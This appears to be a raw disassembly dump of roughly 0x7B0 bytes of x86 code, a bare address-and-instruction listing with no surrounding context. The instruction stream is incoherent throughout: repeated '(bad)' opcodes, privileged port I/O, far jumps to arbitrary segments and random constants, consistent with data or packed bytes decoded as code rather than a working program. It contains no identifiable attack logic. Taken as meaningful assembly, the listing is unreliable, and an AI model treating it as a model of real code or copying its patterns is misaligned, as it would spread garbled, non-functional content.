  42b0b0:	mov    edx,0xff3fa9f4
  42b0b5:	enter  0x1f83,0x7a
  42b0b9:	fild   DWORD PTR [edi-0x560423d1]
  42b0bf:	lods   eax,DWORD PTR ds:[esi]
  42b0c0:	mov    bx,WORD PTR ss:[ecx-0x2f]
  42b0c5:	shl    DWORD PTR [ebp-0x6a],1
  42b0c8:	mov    esp,0x1e65cf5c
  42b0cd:	loopne 0x42b0df
  42b0cf:	add    al,0x1c
  42b0d1:	scas   al,BYTE PTR es:[edi]
  42b0d2:	mov    esp,ecx
  42b0d4:	(bad)  
  42b0d5:	xlat   BYTE PTR fs:[ebx]
  42b0d7:	jns    0x42b0d1
  42b0d9:	mov    esi,0xae1bc765
  42b0de:	lea    esp,[ebp+0x1c]
  42b0e1:	jle    0x42b13a
  42b0e3:	push   edx
  42b0e4:	add    bl,BYTE PTR [edi-0x17c01a75]
  42b0ea:	cmp    edi,DWORD PTR [edi+0x51]
  42b0ed:	pop    esp
  42b0ee:	push   DWORD PTR [edx+0x3ce53d]
  42b0f4:	loopne 0x42b107
  42b0f6:	repz (bad) 
  42b0f8:	pop    ss
  42b0f9:	arpl   sp,di
  42b0fb:	ret    0x32b6
  42b0fe:	fs pusha 
  42b100:	or     eax,ebx
  42b102:	out    dx,eax
  42b103:	or     eax,0xd584822c
  42b108:	add    edi,ecx
  42b10a:	ja     0x42b12a
  42b10c:	add    DWORD PTR [ebx],esi
  42b10e:	push   edi
  42b10f:	fdivp  st(3),st
  42b111:	loopne 0x42b0d0
  42b113:	setae  ch
  42b116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b117:	pop    ebp
  42b118:	jae    0x42b102
  42b11a:	fmul   DWORD PTR [ebx+0x5e]
  42b11d:	retf   0x9ae1
  42b120:	xor    ebp,DWORD PTR [bx+si-0x52e6]
  42b125:	mov    WORD PTR [eax-0x1c],?
  42b128:	les    edx,FWORD PTR [ecx-0x14]
  42b12b:	in     al,dx
  42b12c:	int    0x11
  42b12e:	jns    0x42b14b
  42b130:	mov    bl,0xf1
  42b132:	mov    ebp,0xf75698
  42b137:	cmp    al,0xb7
  42b139:	dec    edx
  42b13a:	cmp    bh,dl
  42b13c:	adc    DWORD PTR [esi+0x3a],esi
  42b13f:	and    ebp,eax
  42b141:	test   BYTE PTR [ebp-0x40],dh
  42b144:	or     eax,0x983a7637
  42b149:	mov    ds:0xd1d3eaaf,eax
  42b14e:	pop    ebp
  42b14f:	jne    0x42b1a9
  42b151:	rcr    DWORD PTR [eax+0x5d28c5af],0xd
  42b158:	daa    
  42b159:	imul   esi,eax,0x52
  42b15c:	adc    DWORD PTR [ecx-0x55],0xeda716e5
  42b163:	mov    esp,0x8311c15c
  42b168:	sub    BYTE PTR [eax],ah
  42b16a:	daa    
  42b16b:	and    BYTE PTR ds:0x5cf55149,dh
  42b171:	cmp    al,0x67
  42b173:	adc    al,0xb3
  42b175:	scas   eax,DWORD PTR es:[edi]
  42b176:	push   esi
  42b177:	push   ds
  42b178:	(bad)  
  42b179:	scas   al,BYTE PTR es:[edi]
  42b17a:	imul   eax,DWORD PTR [ebp-0x8e2da05],0x8
  42b181:	and    BYTE PTR [edi+0x5ee1d26b],ch
  42b187:	dec    edi
  42b188:	sbb    BYTE PTR [edi+ebx*2+0xe950042],ch
  42b18f:	mov    ch,0xf0
  42b191:	ret    
  42b192:	xlat   BYTE PTR ds:[ebx]
  42b193:	not    DWORD PTR [ebx]
  42b195:	sbb    BYTE PTR [eax+0x603297d0],0xcf
  42b19c:	in     eax,dx
  42b19d:	in     al,dx
  42b19e:	in     al,dx
  42b19f:	ret    
  42b1a0:	imul   DWORD PTR [edi-0x24]
  42b1a3:	stc    
  42b1a4:	(bad)  
  42b1a5:	jg     0x42b21d
  42b1a7:	cli    
  42b1a8:	mov    ds:0x9dd9f27f,eax
  42b1ad:	jae    0x42b216
  42b1af:	out    0x39,al
  42b1b1:	out    0x98,eax
  42b1b3:	jae    0x42b1e3
  42b1b5:	push   ss
  42b1b6:	mov    esp,0xbf607b58
  42b1bb:	and    BYTE PTR [ecx-0x37],ah
  42b1be:	jecxz  0x42b205
  42b1c0:	xchg   edi,eax
  42b1c1:	mov    ebx,0x35996fbc
  42b1c6:	jg     0x42b17c
  42b1c8:	mov    eax,0x81d7831c
  42b1cd:	in     eax,0x82
  42b1cf:	cmp    al,0x54
  42b1d1:	adc    BYTE PTR [edi],al
  42b1d3:	xchg   ecx,eax
  42b1d4:	cmp    BYTE PTR [esi],0x9a
  42b1d7:	lock das 
  42b1d9:	add    esp,DWORD PTR [esi]
  42b1db:	idiv   DWORD PTR [ecx+0x0]
  42b1de:	pop    edi
  42b1df:	add    ax,0xc2be
  42b1e3:	mov    dh,0x48
  42b1e5:	adc    BYTE PTR [edx+0x62c0a1fd],al
  42b1eb:	dec    eax
  42b1ec:	push   eax
  42b1ed:	ret    0xa182
  42b1f0:	and    bl,BYTE PTR [eax+0x54]
  42b1f3:	push   es
  42b1f4:	pop    es
  42b1f5:	test   DWORD PTR [edx],ecx
  42b1f7:	ret    
  42b1f8:	xlat   BYTE PTR ds:[ebx]
  42b1f9:	cmp    eax,0xe6603c2c
  42b1fe:	loopne 0x42b19c
  42b200:	or     eax,DWORD PTR [edi-0x51]
  42b203:	jle    0x42b1c6
  42b205:	dec    ebp
  42b206:	sub    ebp,ebx
  42b208:	aaa    
  42b209:	mov    edi,0x35d0e578
  42b20e:	dec    edi
  42b20f:	add    edx,DWORD PTR [ebx-0x5e622225]
  42b215:	pop    esi
  42b216:	fwait
  42b217:	rcl    BYTE PTR [ebp+0x19],0x39
  42b21b:	ins    BYTE PTR es:[edi],dx
  42b21c:	and    DWORD PTR [esi-0x829678d],eax
  42b222:	and    eax,DWORD PTR [ebp+0x65a8268b]
  42b228:	mov    es,WORD PTR [ecx-0x57]
  42b22b:	mov    al,ds:0x1d3b2ad3
  42b230:	inc    esi
  42b231:	loop   0x42b233
  42b233:	out    0x11,eax
  42b235:	jmp    0xe017:0x600b9c31
  42b23c:	jns    0x42b253
  42b23e:	push   ebp
  42b23f:	mov    edx,0x2af6a30a
  42b244:	js     0x42b27d
  42b246:	inc    esi
  42b247:	test   DWORD PTR ds:0xbf291a78,edx
  42b24d:	mov    edi,0x1a35758
  42b252:	mov    fs,WORD PTR [edx+0x4b]
  42b255:	ss add DWORD PTR gs:[edi+ebx*4],ebp
  42b25a:	push   cs
  42b25b:	sub    al,0xd4
  42b25d:	aad    0x9b
  42b25f:	pop    es
  42b260:	push   eax
  42b261:	dec    esi
  42b262:	sbb    ebx,DWORD PTR [ecx]
  42b264:	xchg   ecx,eax
  42b265:	push   0x9bee1f61
  42b26a:	jnp    0x42b298
  42b26c:	in     eax,dx
  42b26d:	pop    ecx
  42b26e:	cmp    BYTE PTR [eax],cl
  42b270:	in     eax,dx
  42b271:	sti    
  42b272:	or     dl,ah
  42b274:	mov    ds:0xec59eb0,eax
  42b279:	mov    cl,0xd7
  42b27b:	fld    DWORD PTR [esi-0x7a79c052]
  42b281:	add    al,0xbb
  42b283:	out    0xb7,eax
  42b285:	mov    ebx,0x72ef65cf
  42b28a:	mov    bl,0x7d
  42b28c:	jmp    0x3ebe787d
  42b291:	cld    
  42b292:	rcl    DWORD PTR [ebx+0x77],1
  42b295:	mov    esp,0xf5be3fb
  42b29a:	aas    
  42b29b:	mov    eax,0xca4d36d7
  42b2a0:	cmp    DWORD PTR [edi],ecx
  42b2a2:	push   ecx
  42b2a3:	icebp  
  42b2a4:	mov    eax,ds:0xf52d0d50
  42b2a9:	push   eax
  42b2aa:	mov    eax,0x51680516
  42b2af:	ror    dl,0xfb
  42b2b2:	cmp    ch,0x42
  42b2b5:	push   cs
  42b2b6:	cmp    al,0x52
  42b2b8:	nop
  42b2b9:	pop    ss
  42b2ba:	pop    ds
  42b2bb:	add    ecx,DWORD PTR [edi+0x3ba1f414]
  42b2c1:	mov    edi,0x56658c78
  42b2c6:	jge    0x42b2a1
  42b2c8:	icebp  
  42b2c9:	xchg   edi,eax
  42b2ca:	pop    ecx
  42b2cb:	std    
  42b2cc:	add    eax,DWORD PTR [ebp+0x2b2f81f]
  42b2d2:	js     0x42b2a8
  42b2d4:	ins    DWORD PTR es:[edi],dx
  42b2d5:	mov    DWORD PTR [edx],edx
  42b2d7:	pop    eax
  42b2d8:	inc    esp
  42b2d9:	std    
  42b2da:	xchg   edi,eax
  42b2db:	sub    DWORD PTR [ecx+0x20f0ba61],eax
  42b2e1:	gs push eax
  42b2e3:	push   ds
  42b2e4:	xlat   BYTE PTR ds:[ebx]
  42b2e5:	mov    dh,0x4f
  42b2e7:	mov    ecx,0x333cf7df
  42b2ec:	pop    es
  42b2ed:	out    dx,eax
  42b2ee:	jge    0x42b335
  42b2f0:	inc    esp
  42b2f1:	jne    0x42b2fb
  42b2f3:	mov    eax,ds:0x8bcd7a3e
  42b2f8:	mov    edi,0xfcfab462
  42b2fd:	pop    ss
  42b2fe:	mov    ch,BYTE PTR [esp+ebx*2+0x723ad223]
  42b305:	push   cs
  42b306:	dec    esp
  42b307:	ror    dl,0xf1
  42b30a:	inc    ebx
  42b30b:	adc    BYTE PTR [esi-0x4bb206dd],bl
  42b311:	loope  0x42b31f
  42b313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b314:	aad    0x83
  42b316:	adc    BYTE PTR [edi+0x6c800aa5],dh
  42b31c:	fisub  WORD PTR [ecx-0x1b]
  42b31f:	loopne 0x42b2cb
  42b321:	or     edx,ebp
  42b323:	mov    al,0x8a
  42b325:	inc    eax
  42b326:	inc    edi
  42b327:	xor    edx,eax
  42b329:	xor    DWORD PTR [eax+0x5e551878],edi
  42b32f:	add    edi,0x4
  42b332:	rcl    edi,0xf0
  42b335:	xor    eax,0x4a407023
  42b33a:	mov    ds:0x60b9c30c,al
  42b33f:	or     dl,BYTE PTR [eax+0x21]
  42b342:	and    BYTE PTR gs:[eax+0x24],0xa7
  42b347:	add    eax,0x97d003d8
  42b34c:	fcom   QWORD PTR [edx+0x7f]
  42b34f:	arpl   WORD PTR [edx+0xf404a0d],ax
  42b355:	in     al,0xf7
  42b357:	lea    edi,[eax]
  42b359:	call   0x53b1:0x339a50c0
  42b360:	fmul   QWORD PTR [ebp+0x3c]
  42b363:	xchg   BYTE PTR [esi-0x6b4567a9],bh
  42b369:	popa   
  42b36a:	sub    DWORD PTR [ecx],ecx
  42b36c:	into   
  42b36d:	xor    DWORD PTR [ebx-0x11],esp
  42b370:	ror    BYTE PTR [esi],cl
  42b372:	retf   0x2fd8
  42b375:	jbe    0x42b3b5
  42b377:	aaa    
  42b378:	fist   DWORD PTR [edi]
  42b37a:	iret   
  42b37b:	pop    edi
  42b37c:	cli    
  42b37d:	int3   
  42b37e:	inc    edi
  42b37f:	out    dx,eax
  42b380:	cmp    BYTE PTR [ebp-0x19],bh
  42b383:	jnp    0x42b373
  42b385:	fdivr  QWORD PTR [esi]
  42b387:	stc    
  42b388:	rcr    BYTE PTR [esi+0x6c],1
  42b38b:	call   0x61fa:0x5a1c6318
  42b392:	in     al,dx
  42b393:	ds mov ah,0xfc
  42b396:	ret    
  42b397:	js     0x42b3f7
  42b399:	push   ss
  42b39a:	(bad)  
  42b39b:	pop    edi
  42b39c:	adc    al,0xc8
  42b39e:	mov    eax,ds:0xe0b458f2
  42b3a3:	mov    ebp,esi
  42b3a5:	sti    
  42b3a6:	xor    al,BYTE PTR [ecx]
  42b3a8:	(bad)
  42b3ab:	push   ss
  42b3ac:	idiv   DWORD PTR [edi]
  42b3ae:	dec    eax
  42b3af:	add    DWORD PTR ds:0x6dd97fdb,ebp
  42b3b5:	rcr    DWORD PTR [ebx],1
  42b3b7:	sbb    DWORD PTR [edx-0x4777002],edi
  42b3bd:	sub    DWORD PTR [edi],0xdd47802b
  42b3c3:	xchg   esi,eax
  42b3c4:	sub    BYTE PTR [eax+0xa878f2],al
  42b3ca:	xchg   BYTE PTR [edi+0x45c69245],dh
  42b3d0:	scas   eax,DWORD PTR es:[edi]
  42b3d1:	mov    al,ds:0x2950f808
  42b3d6:	sub    al,0x2a
  42b3d8:	and    BYTE PTR [ebp-0x5],0x84
  42b3dc:	adc    ah,BYTE PTR [edx]
  42b3de:	adc    BYTE PTR [ecx-0x1b],dl
  42b3e1:	pushf  
  42b3e2:	or     ebp,ebx
  42b3e4:	inc    edi
  42b3e5:	sahf   
  42b3e6:	jnp    0x42b3ab
  42b3e8:	retf   0xcdfa
  42b3eb:	aaa    
  42b3ec:	jae    0x42b426
  42b3ee:	jp     0x42b3f2
  42b3f0:	inc    eax
  42b3f1:	int    0x96
  42b3f3:	out    0x3,al
  42b3f5:	xor    esi,edx
  42b3f7:	scas   al,BYTE PTR es:[edi]
  42b3f8:	cmp    eax,0x2473710c
  42b3fd:	mov    bh,0x83
  42b3ff:	push   esp
  42b400:	pop    ebp
  42b401:	inc    edx
  42b402:	sbb    al,0x9d
  42b404:	inc    edi
  42b405:	scas   al,BYTE PTR es:[edi]
  42b406:	aaa    
  42b407:	loope  0x42b406
  42b409:	add    al,0x55
  42b40b:	mov    esi,0x1d78a316
  42b410:	jmp    0x5750:0x4fc1047c
  42b417:	push   ds
  42b418:	mov    eax,ds:0x94da36d2
  42b41d:	and    esp,DWORD PTR [edx+0x14]
  42b420:	in     al,0x6c
  42b422:	hlt    
  42b423:	pop    eax
  42b424:	jns    0x42b3f6
  42b426:	or     ebx,0x40
  42b429:	inc    ecx
  42b42a:	call   0x4ee98864
  42b42f:	test   al,0x8b
  42b431:	stos   DWORD PTR es:[edi],eax
  42b432:	dec    esi
  42b433:	mov    al,0x56
  42b435:	pop    ebx
  42b436:	mov    al,ds:0xe50beb43
  42b43b:	mov    eax,0xf4806bd8
  42b440:	and    BYTE PTR [edi-0x30a586ff],bl
  42b446:	pusha  
  42b447:	pop    ebp
  42b448:	xchg   BYTE PTR [esi+0x4c4e471f],ch
  42b44e:	dec    eax
  42b44f:	ins    DWORD PTR es:[edi],dx
  42b450:	shl    BYTE PTR [edx],cl
  42b452:	popf   
  42b453:	inc    ecx
  42b454:	(bad)  
  42b455:	sahf   
  42b456:	cdq    
  42b457:	fidivr DWORD PTR [ebp-0x4560f0cd]
  42b45d:	cld    
  42b45e:	(bad)  
  42b460:	out    dx,eax
  42b461:	cmp    dh,BYTE PTR [ebx-0x9]
  42b464:	sti    
  42b465:	out    dx,eax
  42b466:	fnstsw WORD PTR [ebx+0x629a6e70]
  42b46c:	dec    esp
  42b46d:	push   ecx
  42b46e:	jmp    0x2d333ef6
  42b473:	adc    esi,DWORD PTR [edx+0xcbfcb45]
  42b479:	sub    BYTE PTR [ebx+0x74],bl
  42b47c:	rcl    DWORD PTR [edi],cl
  42b47e:	sub    eax,0xff0f22ea
  42b483:	xor    ch,BYTE PTR [edi+0x21]
  42b486:	cs sbb al,0xf7
  42b489:	mov    al,ds:0xf3f17f18
  42b48e:	rcl    DWORD PTR [edx-0x1edf083],cl
  42b494:	inc    ebp
  42b495:	imul   edi,DWORD PTR [edi-0x70],0xffffffd5
  42b499:	mov    edx,0x1e5f0063
  42b49f:	or     eax,0x4b6f39f6
  42b4a4:	lock xor BYTE PTR [edx-0x41],0x58
  42b4a9:	sub    al,0xb4
  42b4ab:	sub    al,0x2c
  42b4ad:	cmp    BYTE PTR [eax+0x11],cl
  42b4b0:	sub    al,0x2a
  42b4b2:	test   BYTE PTR [edx],ah
  42b4b4:	cld    
  42b4b5:	mov    ecx,DWORD PTR [edx+0x60]
  42b4b8:	xor    ebx,ecx
  42b4ba:	adc    BYTE PTR [eax],dh
  42b4bc:	lock or al,0x44
  42b4bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b4c0:	data16 data16 aas 
  42b4c3:	pop    ecx
  42b4c4:	cmp    DWORD PTR [esi+0x5e47eb2],esi
  42b4ca:	iret   
  42b4cb:	push   cs
  42b4cc:	xchg   ebx,eax
  42b4cd:	sbb    ebp,DWORD PTR [edi+0x62]
  42b4d0:	mov    bh,0x7e
  42b4d2:	add    al,0x90
  42b4d4:	sar    BYTE PTR [esi-0x2c652148],0x5f
  42b4db:	cmp    eax,0xe5620ebe
  42b4e0:	adc    DWORD PTR [eax-0x372e7f16],ebp
  42b4e6:	cmp    DWORD PTR [ecx+eiz*1],0x67
  42b4ea:	cmp    DWORD PTR gs:[esi],edx
  42b4ed:	rol    BYTE PTR [esi+0x320f2222],cl
  42b4f3:	pop    edx
  42b4f4:	mov    dl,0x62
  42b4f6:	cdq    
  42b4f7:	mov    DWORD PTR [edi+esi*8-0x343f33fc],esp
  42b4fe:	lock lahf 
  42b500:	adc    bl,bl
  42b502:	pop    ss
  42b503:	mov    edx,0x6484c2ae
  42b508:	scas   al,BYTE PTR es:[edi]
  42b509:	mov    edi,0xf31a7bc2
  42b50e:	dec    ebx
  42b50f:	leave  
  42b510:	add    al,0xa0
  42b512:	(bad)  
  42b513:	fisttp QWORD PTR [ebx]
  42b515:	fwait
  42b516:	test   BYTE PTR cs:[eax-0x410d1183],dh
  42b51d:	call   0xf9a5:0x33022101
  42b524:	lds    ecx,FWORD PTR [ebx]
  42b526:	xchg   edi,eax
  42b527:	ja     0x42b4f8
  42b529:	fidivr WORD PTR [ebx-0x1]
  42b52c:	stc    
  42b52d:	sti    
  42b52e:	aas    
  42b52f:	clc    
  42b530:	test   eax,0xbe9f53ad
  42b535:	fmul   st(6),st
  42b537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b538:	lods   eax,DWORD PTR ds:[esi]
  42b539:	mov    BYTE PTR [eax-0x74],cl
  42b53c:	jno    0x42b4cc
  42b53e:	std    
  42b53f:	inc    edx
  42b540:	(bad)  
  42b542:	push   edx
  42b543:	nop
  42b544:	push   ss
  42b545:	test   DWORD PTR [eax],ebp
  42b547:	bound  edi,QWORD PTR [ecx+0x6b0da0]
  42b54d:	xchg   bh,bh
  42b54f:	das    
  42b550:	or     bh,BYTE PTR [eax-0x47]
  42b553:	outs   dx,DWORD PTR ds:[esi]
  42b554:	mov    cl,0x5c
  42b556:	adc    BYTE PTR [edi],dl
  42b558:	arpl   cx,si
  42b55a:	sub    DWORD PTR [esi+esi*8+0x20e1af32],0x21
  42b562:	pop    edi
  42b563:	es in  al,dx
  42b565:	mov    eax,DWORD PTR [edx+0x3f]
  42b568:	hlt    
  42b569:	xchg   si,ax
  42b56b:	pop    edx
  42b56c:	jge    0x42b54e
  42b56e:	mov    edi,DWORD PTR [ebx]
  42b570:	and    eax,edi
  42b572:	sub    DWORD PTR [edi+0x299b8600],ebp
  42b578:	and    DWORD PTR [ecx-0x6921e7ee],0xffffff85
  42b57f:	add    eax,0xc1c7b1e5
  42b584:	retf   0x4ae0
  42b587:	mov    ah,BYTE PTR [ecx+0x59]
  42b58a:	sbb    cl,ah
  42b58c:	pop    ss
  42b58d:	pop    edi
  42b58e:	das    
  42b58f:	sahf   
  42b590:	add    DWORD PTR [ecx+edi*1-0x8],edx
  42b594:	sar    eax,1
  42b596:	call   0xe814b085
  42b59b:	fbstp  TBYTE PTR [eax]
  42b59d:	call   0x5c8e:0xece9e33c
  42b5a4:	ret    
  42b5a5:	push   ebp
  42b5a6:	pop    ebp
  42b5a7:	xchg   edx,ebx
  42b5a9:	jae    0x42b553
  42b5ab:	sub    ebx,DWORD PTR ds:0xc4795a48
  42b5b1:	mov    ss:0x8fa8b599,al
  42b5b7:	lods   al,BYTE PTR ds:[esi]
  42b5b8:	rcl    BYTE PTR [ebp+0x5e],0xdd
  42b5bc:	jae    0x42b601
  42b5be:	in     eax,0xd1
  42b5c0:	fisttp QWORD PTR [ebx]
  42b5c2:	mov    edx,0xe2fd9d54
  42b5c7:	popa   
  42b5c8:	lds    ebx,FWORD PTR [esi-0x57]
  42b5cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b5cc:	jmp    0x42b5a8
  42b5ce:	ins    DWORD PTR es:[edi],dx
  42b5cf:	fst    DWORD PTR [eax-0x43fdd05]
  42b5d5:	cmp    BYTE PTR [edx],0xab
  42b5d8:	std    
  42b5d9:	daa    
  42b5da:	inc    esi
  42b5db:	mov    WORD PTR [ecx],cs
  42b5dd:	mov    ebx,0xb63ab7e7
  42b5e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b5e3:	ds pop edi
  42b5e5:	iret   
  42b5e6:	add    BYTE PTR [ebx-0x332c861c],dl
  42b5ec:	das    
  42b5ed:	lahf   
  42b5ee:	cmp    eax,0xe9f8bd3f
  42b5f3:	pop    es
  42b5f4:	cs ds je 0x42b5d3
  42b5f8:	addr16 jbe 0x42b5ca
  42b5fb:	lahf   
  42b5fc:	fsubr  QWORD PTR [esi+0x67]
  42b5ff:	rcl    DWORD PTR [esi],cl
  42b601:	inc    eax
  42b602:	dec    esi
  42b603:	sub    DWORD PTR [ebp-0x75],eax
  42b606:	jmp    0x43a3b7a2
  42b60b:	ja     0x42b688
  42b60d:	pop    ecx
  42b60e:	fdivr  QWORD PTR [edi-0x117413d8]
  42b614:	stc    
  42b615:	mov    dl,0xff
  42b617:	xchg   edi,eax
  42b618:	push   ebp
  42b619:	ficom  WORD PTR [ebp-0x138da3a5]
  42b61f:	inc    ebp
  42b620:	gs jb  0x42b5b3
  42b623:	mov    bh,0xb0
  42b625:	call   0x278de22f
  42b62a:	cs repz inc eax
  42b62d:	xchg   esi,eax
  42b62e:	(bad)  
  42b631:	or     BYTE PTR [edi-0xba008db],0xd1
  42b638:	loopne 0x42b5fa
  42b63a:	pop    edi
  42b63b:	xor    DWORD PTR ds:0x13ad2c00,eax
  42b641:	sbb    BYTE PTR [esi],bh
  42b643:	cs pop esi
  42b645:	rcl    BYTE PTR [eax+0x11],0xc
  42b649:	cmp    eax,0x7ee4bf03
  42b64e:	push   ecx
  42b64f:	add    DWORD PTR [ebx+edx*2],ebp
  42b652:	or     al,0x43
  42b654:	das    
  42b655:	popa   
  42b656:	mov    eax,0xc20f32df
  42b65b:	xor    DWORD PTR [ebx-0x48a3189],esi
  42b661:	adc    BYTE PTR [ecx+0x62743b5b],dl
  42b667:	jge    0x42b6ce
  42b669:	in     eax,dx
  42b66a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b66b:	imul   eax,edi,0x2b
  42b66e:	aaa    
  42b66f:	sbb    al,0xa7
  42b671:	jo     0x42b66b
  42b673:	sbb    cl,dl
  42b675:	js     0x42b67c
  42b677:	in     al,dx
  42b678:	cmp    al,0x1c
  42b67a:	xor    eax,DWORD PTR [edi+0x31af79c2]
  42b680:	jle    0x42b6d9
  42b682:	pushf  
  42b683:	ror    DWORD PTR [ecx-0x3],cl
  42b686:	shr    dl,1
  42b688:	arpl   WORD PTR [eax],ax
  42b68a:	hlt    
  42b68b:	mov    eax,ds:0xb721f413
  42b690:	push   ds
  42b691:	sbb    BYTE PTR [ebp+0x39],bl
  42b694:	scas   eax,DWORD PTR es:[edi]
  42b695:	or     al,0x94
  42b697:	inc    eax
  42b698:	test   eax,0xe16557ef
  42b69d:	nop
  42b69e:	call   0xddb4:0xded9e636
  42b6a5:	cmp    DWORD PTR [edi+0x61],edi
  42b6a8:	mov    edx,0x9de9c0f9
  42b6ad:	repz neg DWORD PTR [esi-0x6600c527]
  42b6b4:	mov    ebp,DWORD PTR [ecx-0xb2ea593]
  42b6ba:	ret    0xe050
  42b6bd:	pop    ss
  42b6be:	fucomp st(7)
  42b6c0:	inc    ebp
  42b6c1:	lock imul esi,DWORD PTR [ecx],0xffffffe6
  42b6c5:	pop    ds
  42b6c6:	ds mov bh,0x4c
  42b6c9:	pop    ecx
  42b6ca:	sub    al,0x73
  42b6cc:	int    0x17
  42b6ce:	inc    ecx
  42b6cf:	sar    DWORD PTR [eax+esi*2-0xc237c74],0x65
  42b6d7:	push   esi
  42b6d8:	cli    
  42b6d9:	jae    0x42b68c
  42b6db:	call   0x9685c137
  42b6e0:	or     ebx,edi
  42b6e2:	inc    ecx
  42b6e3:	outs   dx,BYTE PTR ds:[esi]
  42b6e4:	(bad)  
  42b6e5:	adc    eax,0xb1e07d63
  42b6ea:	adc    DWORD PTR [esi-0x20],edi
  42b6ed:	scas   eax,DWORD PTR es:[edi]
  42b6ee:	mov    al,ds:0x86960002
  42b6f3:	add    eax,0x2cb06543
  42b6f8:	gs pop eax
  42b6fa:	push   ds
  42b6fb:	das    
  42b6fc:	dec    ebx
  42b6fd:	and    DWORD PTR [esi],ecx
  42b6ff:	pop    ds
  42b700:	push   edi
  42b701:	call   0x7aa47b47
  42b706:	mov    cl,0xbc
  42b708:	push   esi
  42b709:	test   BYTE PTR [ecx+ebx*4+0x2],bh
  42b70d:	lock or edi,ebx
  42b710:	xchg   ecx,esp
  42b712:	addr16 cmp bh,ah
  42b715:	add    dh,BYTE PTR [ebx]
  42b717:	jnp    0x42b77f
  42b719:	jbe    0x42b754
  42b71b:	imul   esi,DWORD PTR [ecx+0x10b91130],0x26
  42b722:	cmc    
  42b723:	js     0x42b70a
  42b725:	call   0x6a6b:0xabbdbfff
  42b72c:	sbb    eax,DWORD PTR [esi]
  42b72e:	sub    BYTE PTR [ebx+0x3b],0x50
  42b732:	cmp    al,BYTE PTR [ebx]
  42b734:	ret    
  42b735:	or     edi,edi
  42b737:	dec    edi
  42b739:	cmc    
  42b73a:	test   eax,0xd307e87d
  42b73f:	inc    edx
  42b740:	sub    DWORD PTR [ecx-0x36bb782c],esi
  42b746:	jns    0x42b705
  42b748:	daa    
  42b749:	leave  
  42b74a:	imul   edi,ecx,0x632676b4
  42b750:	pop    ecx
  42b751:	xchg   edx,eax
  42b752:	adc    eax,0x7b7bbc07
  42b757:	out    0x60,eax
  42b759:	cs iret 
  42b75b:	aas    
  42b75c:	ficomp WORD PTR [ebp+ebx*4+0x5f]
  42b760:	fcomp  QWORD PTR [edi+ecx*1-0x65]
  42b764:	jmp    0x42b711
  42b766:	loope  0x42b754
  42b768:	repnz mov dl,0x1b
  42b76b:	ds pop esp
  42b76d:	mov    al,ds:0xfaeb3f3b
  42b772:	popa   
  42b773:	ror    DWORD PTR ds:0x3b0ddf7d,cl
  42b779:	inc    esi
  42b77a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b77b:	xchg   DWORD PTR [ebp-0x4f80048a],ebx
  42b781:	popa   
  42b782:	lahf   
  42b783:	les    ebx,FWORD PTR [ebx]
  42b785:	rol    DWORD PTR [ebx+0x244f77f3],cl
  42b78b:	or     DWORD PTR [ecx-0x24],esi
  42b78e:	outs   dx,BYTE PTR ds:[esi]
  42b78f:	jecxz  0x42b789
  42b791:	lock adc BYTE PTR [edi-0x40708809],dh
  42b798:	mov    edi,0xffb9fedf
  42b79d:	cld    
  42b79e:	in     eax,dx
  42b79f:	(bad)  
  42b7a0:	out    0x97,eax
  42b7a2:	pop    ds
  42b7a3:	ja     0x42b75c
  42b7a5:	lahf   
  42b7a6:	mov    esi,0xdafc3e3e
  42b7ab:	xchg   BYTE PTR [ebp-0x32],bl
  42b7ae:	jle    0x42b7d0
  42b7b0:	ret    0xec9e
  42b7b3:	dec    esp
  42b7b4:	push   esi
  42b7b5:	gs in  eax,0x2d
  42b7b8:	sub    DWORD PTR [ecx+0x18],ebx
  42b7bb:	fadd   DWORD PTR [ecx]
  42b7bd:	fdivr  DWORD PTR [edi+ebx*1-0x19336d68]
  42b7c4:	jmp    0x4540:0xed736f9c
  42b7cb:	push   0x44abc8f
  42b7d0:	jb     0x42b78b
  42b7d2:	mov    edi,0x90d40faa
  42b7d7:	ds sbb esi,ecx
  42b7da:	and    DWORD PTR [edi+0x2ac27e23],0xb9c12005
  42b7e4:	push   ebp
  42b7e5:	enter  0xa062,0xa
  42b7e9:	xchg   BYTE PTR [edx+eiz*1+0x7f019aa8],bl
  42b7f0:	jecxz  0x42b782
  42b7f2:	fld    QWORD PTR [edx]
  42b7f4:	or     eax,DWORD PTR [edi+esi*8]
  42b7f7:	popf   
  42b7f8:	cdq    
  42b7f9:	xor    eax,0x707b9a7a
  42b7fe:	and    al,0x7d
  42b800:	fucomip st,st(7)
  42b802:	push   0xc473fbbd
  42b807:	mov    eax,ds:0xc63efbef
  42b80c:	cmp    ah,al
  42b80e:	ret    
  42b80f:	ret    
  42b810:	add    BYTE PTR [esi],ah
  42b812:	out    dx,al
  42b813:	shl    BYTE PTR es:[edi-0xb],cl
  42b817:	and    cl,dh
  42b819:	and    DWORD PTR [edi+0x6e7ff6ee],ecx
  42b81f:	pop    ss
  42b820:	arpl   WORD PTR [eax+eax*1],cx
  42b823:	inc    edx
  42b824:	or     BYTE PTR [ecx],ah
  42b826:	les    ebx,FWORD PTR [eax]
  42b828:	(bad)  
  42b829:	sbb    eax,0x524467cf
  42b82e:	push   ecx
  42b82f:	shr    DWORD PTR [ebx],cl
  42b831:	xchg   esp,eax
  42b832:	fnstcw WORD PTR [ebp+edi*2-0x75]
  42b836:	cmp    al,0xd9
  42b838:	fadd   DWORD PTR [esi-0x346fc8d5]
  42b83e:	mov    ebx,0x4508395
  42b843:	scas   al,BYTE PTR es:[edi]
  42b844:	sub    eax,0x53579d8
  42b849:	iret   
  42b84a:	fidiv  DWORD PTR [ebx-0x60eea83b]
  42b850:	jg     0x42b859
  42b852:	dec    edi
  42b853:	dec    esi
  42b854:	jle    0x42b836
  42b856:	std    
  42b857:	jg     0x42b86c
  42b859:	mov    al,0x16
  42b85b:	cld    
  42b85c:	dec    ebx
  42b85d:	dec    eax
  42b85e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b85f:	or     DWORD PTR [esi+0x3f],esp
  42b862:	loopne 0x42b8ac
  42b864:	test   al,0x11
  42b866:	cli    
  42b867:	push   cs
